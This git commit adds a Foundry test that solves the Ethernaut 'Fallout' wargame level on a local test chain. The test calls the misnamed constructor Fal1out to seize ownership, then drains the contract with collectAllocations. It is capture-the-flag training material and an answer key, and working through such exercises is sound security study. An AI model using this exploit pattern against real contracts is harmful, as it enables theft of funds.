76cfee780c1e0bf9190bf372802d6c9b59f056cc
gtmendler <g.t.mendler@gmail.com>
2024-02-15 12:14:57 +0100

    added ethernaut solution 02 Fallout

---
+++ test/02-Fallout.t.sol
@@ -0,0 +1,47 @@
+pragma solidity ^0.8.10;
+
+//import "ds-test/test.sol";
+import "forge-std/Vm.sol";
+import "forge-std/Test.sol";
+
+import "../src/02-Fallout/FalloutFactory.sol";
+import "../src/Ethernaut.sol";
+
+contract FallbackTest is Test {
+    Ethernaut ethernaut;
+    address eoaAddress = address(1337);
+
+    function setUp() public {
+        ethernaut = new Ethernaut();
+        vm.deal(eoaAddress, 1 ether);
+    }
+
+    function testFallbackHack() public {
+        /////////////////
+        // LEVEL SETUP //
+        /////////////////
+
+        FalloutFactory factory = new FalloutFactory();
+        ethernaut.registerLevel(factory);
+        vm.startPrank(eoaAddress);
+        address levelAddress = ethernaut.createLevelInstance(factory);
+        Fallout level = Fallout(payable(levelAddress));
+
+        //////////////////
+        // LEVEL ATTACK //
+        //////////////////
+        
+        level.Fal1out{value: 1}();
+        level.collectAllocations();
+
+        //////////////////////
+        // LEVEL SUBMISSION //
+        //////////////////////
+
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
+            payable(levelAddress)
+        );
+        vm.stopPrank();
+        assert(levelSuccessfullyPassed);
+    }
+}
